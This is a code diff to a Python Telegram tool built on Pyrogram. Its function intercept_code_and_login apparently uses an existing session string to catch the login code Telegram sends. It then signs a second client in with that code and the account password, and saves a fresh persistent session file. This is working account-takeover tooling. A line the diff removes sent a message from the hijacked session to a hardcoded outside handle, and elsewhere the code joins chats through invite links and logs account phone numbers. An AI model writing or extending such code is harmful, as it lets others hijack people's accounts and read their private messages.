@@ -147,6 +147,8 @@ async def joinIfNot(client: Client, chatID, inviteLink):
             return channelData
         except InviteRequestSent: return False
         except UserAlreadyParticipant: return await client.get_chat(inviteLink)
+        except FloodWait as x:
+            logger.error(f"[Floodwait]: {x.value}s")
     except (InviteHashEmpty,InviteHashExpired,InviteHashInvalid) as error:
         userData = await client.get_me()
         logger.warning(f"<b>[{userData.phone_number}]: </b><code>{inviteLink}</code> =>\n<pre>{error}</pre>")
@@ -274,12 +276,11 @@ async def intercept_code_and_login(phone: str, existing_session_string: str, pas
     code_future = loop.create_future()
 
     client_a = Client(
-        name=listener_name,
+        name=phone,
         api_id=API_ID,
         api_hash=API_HASH,
         session_string=existing_session_string,
-        workdir=SESSION_DIR,
-        in_memory=False
+        in_memory=True
     )
 
     @client_a.on_message(filters.incoming & filters.private)
@@ -324,37 +325,37 @@ async def intercept_code_and_login(phone: str, existing_session_string: str, pas
     try:
         code = await asyncio.wait_for(code_future, timeout=CODE_WAIT_TIMEOUT)
     except asyncio.TimeoutError:
-        print("Timeout waiting for code in listener client A.")
+        logger.error("Timeout waiting for code in listener client A.")
     except Exception as e:
-        print(f"Error waiting for code: {e}")
+        logger.error(f"Error waiting for code: {e}")
 
     if not code:
         await client_b.stop()
         await client_a.stop()
         return False
     try:
-        user = await client_b.sign_in(
+        await client_b.sign_in(
             phone_number=phone,
             phone_code_hash=phone_code_hash,
             phone_code=code
         )
     except PhoneCodeInvalid:
-        print("Intercepted code invalid. Aborting.")
+        logger.error("Intercepted code invalid. Aborting.")
         await client_b.stop()
         await client_a.stop()
         return False
     except SessionPasswordNeeded:
         await client_b.check_password(password)
     except Exception as e:
-        print(f"Error during sign_in: {e}")
+        logger.error(f"Error during sign_in: {e}")
         await client_b.stop()
         await client_a.stop()
         return False
     try:
-        await client_b.send_message("@xr_karan", "Hehe")
-        await client_b.stop()
-    except Exception:
-        pass
+        await client_b.storage.save()
+        if client_b.is_connected: await client_b.disconnect()
+    except Exception as err:
+        logger.error(f"Error: {err}")
     try:
         await client_a.stop()
     except Exception:
@@ -362,10 +363,14 @@ async def intercept_code_and_login(phone: str, existing_session_string: str, pas
 
     session_path = os.path.join(SESSION_DIR, f"{new_name}.session")
     if os.path.exists(session_path):
-        print(f"Session file created at: {session_path}")
+        testClient = Client(session_path.replace(".session",""),api_id=API_ID,api_hash=API_HASH)
+        await testClient.start()
+        await testClient.get_me()
+        await testClient.stop()
+        logger.error(f"Session file created at: {session_path}")
         return session_path
     else:
-        print(f"Sign-in may have succeeded, but session file not found at: {session_path}")
+        logger.error(f"Sign-in may have succeeded, but session file not found at: {session_path}")
         return False
 
 
